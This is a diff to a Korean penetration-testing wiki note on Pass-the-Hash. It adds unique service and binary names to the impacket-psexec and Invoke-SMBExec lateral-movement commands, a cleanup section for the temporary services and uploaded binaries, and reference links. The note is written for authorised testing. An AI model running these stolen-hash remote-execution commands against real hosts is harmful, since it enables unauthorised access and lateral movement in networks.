@@ -17,7 +17,7 @@ tags:
 
 ## 사용할 때
 
-- 현재 보유 정보: SAM·LSASS·NTDS에서 수집한 `<USER>`의 NT hash 또는 `LM:NTLM` 형식과 해당 계정의 로컬·도메인 범위를 알고 있다. Responder·PCAP에서 캡처한 NetNTLMv1/v2 challenge-response는 NT hash와 다르며 그대로 Pass the Hash에 사용하지 않는다.
+- 현재 보유 정보: SAM·LSASS·NTDS에서 수집한 `<USER>`의 NT hash 또는 `LM:NTLM` 형식과 해당 계정의 로컬·도메인 범위를 알고 있다. Responder·PCAP에서 캡처한 NetNTLMv1/v2 challenge-response는 NT hash와 다르며 그대로 Pass the Hash에 사용하지 않는다. 두 자료와 relay된 서비스 연결의 관계는 [[NTLM 인증 자료, 실시간 Relay와 서비스 권한 경계]]를 따른다.
 - 명령 실행 위치: NetExec·Impacket·Evil-WinRM·xfreerdp를 실행할 공격 호스트에서 `<TARGET>`의 선택한 서비스 주소·포트까지 직접 또는 검증된 피벗 경로로 도달해야 한다.
 - 현재 계정·권한: hash 보유는 아직 `<TARGET>` 인증 성공이 아니다. 로컬 계정은 `--local-auth`, 도메인 계정은 `<DOMAIN>\\<USER>` 범위로 검증하며, 인증 성공과 대상 로컬 관리자 권한을 따로 확인한다.
 - 지금 가능한 행동: SMB `445/TCP`로 인증과 share·관리자 단서를 먼저 보고, 해당 서비스 조건과 권한이 맞을 때만 PsExec·WMI·WinRM·RDP로 확장한다.
@@ -69,7 +69,7 @@ netexec smb <TARGET> -u <USER> -H <NTLM_HASH> --shares
 #### Impacket 원격 실행
 
 ```bash
-impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH>
+impacket-psexec <USER>@<TARGET> -hashes :<NTLM_HASH> -service-name <PSEXEC_SERVICE> -remote-binary-name <PSEXEC_REMOTE_BINARY>.exe
 impacket-wmiexec <USER>@<TARGET> -hashes :<NTLM_HASH>
 ```
 
@@ -95,7 +95,7 @@ xfreerdp /v:<TARGET> /d:<DOMAIN> /u:<USER> /pth:<NTLM_HASH> /cert:tofu /dynamic-
 
 ```powershell
 Import-Module .\Invoke-TheHash.psd1
-Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami /all" -Verbose
+Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami /all" -Service <INVOKE_HASH_SERVICE> -Verbose
 Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <NTLM_HASH> -Command "whoami /all"
 ```
 
@@ -138,6 +138,8 @@ reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
 - 관리자·도메인 권한: `(Pwn3d!)`를 단서로 삼되 실제 원격 명령·그룹·무결성 수준으로 로컬 관리자 여부를 확정하고, Domain Admin 멤버십과 DCSync 권한은 별도로 확인한다.
 
 ## 변경 영향과 복구
+
+PsExec와 Invoke-SMBExec은 대상에 임시 서비스를 만들며 PsExec는 ADMIN$에 실행 파일도 업로드한다. 실행 전 존재하지 않는 고유 `<PSEXEC_SERVICE>`, `<PSEXEC_REMOTE_BINARY>.exe`, `<INVOKE_HASH_SERVICE>`를 선택하고, 정상 종료 메시지 뒤에도 각각 [[impacket-psexec]]와 [[Invoke-TheHash]]의 exact 식별자 확인·정리를 수행한다. `whoami` 같은 조회 명령 외의 원격 명령이 만든 계정·파일·설정은 해당 명령의 책임 문서에서 별도로 복구한다.
 
 Restricted Admin Mode 값을 변경했다면 실행 전 `reg query` 결과를 기준으로 되돌린다.
 
@@ -185,3 +187,5 @@ reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin
 
 - [Microsoft: Remote Credential Guard and Restricted Admin mode](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
 - [FreeRDP: command-line options](https://github.com/FreeRDP/FreeRDP/blob/master/client/common/cmdline.h)
+- [Fortra Impacket: psexec implementation](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
+- [Kevin-Robertson Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
